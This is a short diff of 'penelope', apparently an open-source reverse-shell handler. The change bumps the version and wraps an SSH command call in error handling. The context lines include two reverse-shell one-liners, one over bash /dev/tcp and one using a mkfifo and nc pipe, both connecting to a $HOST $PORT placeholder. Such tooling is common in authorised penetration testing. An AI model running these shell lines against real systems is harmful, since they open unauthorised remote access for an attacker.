@@ -16,7 +16,7 @@
 # along with this program.  If not, see <https://www.gnu.org/licenses/>.
 
 __program__= "penelope"
-__version__ = "0.13.13"
+__version__ = "0.14.0"
 
 import os
 import io
@@ -5025,12 +5025,15 @@ def main():
 				f"printf \"(bash >& /dev/tcp/$HOST/$PORT 0>&1) &\"|bash ||"
 				f"printf \"(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc $HOST $PORT >/tmp/_) >/dev/null 2>&1 &\"|sh"
 			)
-		if subprocess.run(options.args).returncode == 0:
-			logger.info("SSH command executed!")
-			menu.start()
-		else:
-			core.stop()
-			sys.exit(1)
+		try:
+			if subprocess.run(options.args).returncode == 0:
+				logger.info("SSH command executed!")
+				menu.start()
+			else:
+				core.stop()
+				sys.exit(1)
+		except Exception as e:
+			logger.error(e)
 
 	# Bind shell
 	elif options.connect:
